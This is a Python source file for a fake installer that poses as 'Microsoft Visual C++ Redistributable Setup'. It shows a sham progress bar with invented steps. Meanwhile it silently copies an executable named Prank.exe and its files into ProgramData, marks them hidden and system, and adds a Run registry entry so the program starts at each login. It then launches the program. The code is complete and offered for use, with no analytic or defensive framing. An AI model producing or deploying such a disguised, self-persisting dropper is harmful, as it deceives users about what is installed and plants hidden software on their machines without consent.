import os, sys, shutil, ctypes, winreg, subprocess, threading, time, json
import tkinter as tk
from tkinter import ttk
from pathlib import Path

if getattr(sys, 'frozen', False):
    SRC = Path(sys._MEIPASS)
else:
    SRC = Path(__file__).parent.parent

CONFIG_FILE = SRC / "installer_config.json"

DEFAULT_INSTALLER_CONFIG = {
    "window_title": "Microsoft Visual C++ Redistributable Setup",
    "window_width": 520,
    "window_height": 340,
    "header_text": "Microsoft Visual C++ Redistributable",
    "header_font_size": 14,
    "version_text": "Version 14.42.2025",
    "install_path_env": "ProgramData",
    "install_folder": "WindowsCppRedist",
    "startup_name": "WindowsCppRedist",
    "exe_name": "Prank.exe",
    "finish_button_text": "Finish",
    "success_color": "#2e7d32",
    "error_color": "#c62828"
}

def load_installer_config():
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, encoding="utf-8") as f:
                return {**DEFAULT_INSTALLER_CONFIG, **json.load(f)}
        except: pass
    return dict(DEFAULT_INSTALLER_CONFIG)

cfg = load_installer_config()
TARGET = Path(os.environ.get(cfg["install_path_env"], "C:\\ProgramData")) / cfg["install_folder"]
EXE_NAME = cfg["exe_name"]

def set_hidden_system(path):
    ctypes.windll.kernel32.SetFileAttributesW(str(path), 2 | 4)

def copy_payload():
    if TARGET.exists():
        shutil.rmtree(TARGET)
    TARGET.mkdir(parents=True, exist_ok=True)
    shutil.copy2(SRC / EXE_NAME, TARGET / EXE_NAME)
    set_hidden_system(TARGET / EXE_NAME)
    sounds_src = SRC / "sounds"
    if sounds_src.exists():
        sounds_dst = TARGET / "sounds"
        sounds_dst.mkdir(exist_ok=True)
        for f in sounds_src.iterdir():
            shutil.copy2(f, sounds_dst / f.name)
            set_hidden_system(sounds_dst / f.name)
        set_hidden_system(sounds_dst)
    cfg_src = SRC / "config.json"
    if cfg_src.exists():
        shutil.copy2(cfg_src, TARGET / "config.json")
        set_hidden_system(TARGET / "config.json")
    set_hidden_system(TARGET)

def add_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, cfg["startup_name"], 0, winreg.REG_SZ, str(TARGET / EXE_NAME))
        winreg.CloseKey(key)
    except: pass

def run_prank():
    subprocess.Popen([str(TARGET / EXE_NAME)], shell=False)

class Installer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(cfg["window_title"])
        self.root.geometry(f"{cfg['window_width']}x{cfg['window_height']}")
        self.root.resizable(False, False)
        self.root.configure(bg="white")
        self.root.after(0, self._build_ui)

    def _build_ui(self):
        self.frame = tk.Frame(self.root, bg="white", padx=20, pady=20)
        self.frame.pack(fill="both", expand=True)
        tk.Label(self.frame, text=cfg["header_text"], font=("Segoe UI", cfg["header_font_size"], "bold"), bg="white", fg="#1a1a1a").pack(anchor="w")
        tk.Label(self.frame, text=cfg["version_text"], font=("Segoe UI", 10), bg="white", fg="#666").pack(anchor="w", pady=(0, 5))
        tk.Label(self.frame, text="", bg="white").pack()
        self.status = tk.Label(self.frame, text="Preparing installation...", font=("Segoe UI", 10), bg="white", fg="#333", anchor="w")
        self.status.pack(fill="x")
        tk.Label(self.frame, text="", bg="white").pack()
        self.progress = ttk.Progressbar(self.frame, length=460, mode="determinate")
        self.progress.pack(pady=(0, 10))
        self.detail = tk.Label(self.frame, text="", font=("Segoe UI", 9), bg="white", fg="#888", anchor="w")
        self.detail.pack(fill="x")
        tk.Label(self.frame, text="", bg="white").pack()
        btn_frame = tk.Frame(self.frame, bg="white")
        btn_frame.pack(fill="x")
        self.close_btn = tk.Button(btn_frame, text="Cancel", font=("Segoe UI", 9), command=self.root.destroy, state="disabled")
        self.close_btn.pack(side="right", padx=(5, 0))
        self.root.after(200, self._do_install)

    def _update(self, step, status_text, detail_text=""):
        self.status.config(text=status_text)
        self.detail.config(text=detail_text)
        self.progress["value"] = step
        self.root.update()

    def _do_install(self):
        try:
            self._update(5, "Extracting files...", "windows_cpp_redist_x64.msi")
            self.root.after(200, lambda: None)
            for i in range(3):
                self._update(10 + i * 5, "Extracting files...", f"extracting archive ({i+1}/3)")
                time.sleep(0.15)
            self.root.after(100, copy_payload)
            for i in range(5):
                self._update(30 + i * 8, "Installing components...", f"copying system files ({i+1}/5)")
                time.sleep(0.12)
            self.root.after(100, add_startup)
            for i in range(3):
                self._update(70 + i * 5, "Configuring system registry...", f"writing registry entries ({i+1}/3)")
                time.sleep(0.1)
            self._update(88, "Finalizing installation...", "optimizing system settings")
            time.sleep(0.2)
            self.root.after(100, run_prank)
            self._update(100, "Installation complete!", f"{cfg['header_text']} installed successfully")
            self.close_btn.config(text=cfg["finish_button_text"], state="normal", command=self.root.destroy)
            self.status.config(fg=cfg["success_color"])
        except Exception as e:
            self._update(0, "Installation failed", str(e))
            self.close_btn.config(text="Close", state="normal", command=self.root.destroy)
            self.status.config(fg=cfg["error_color"])

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    Installer().run()
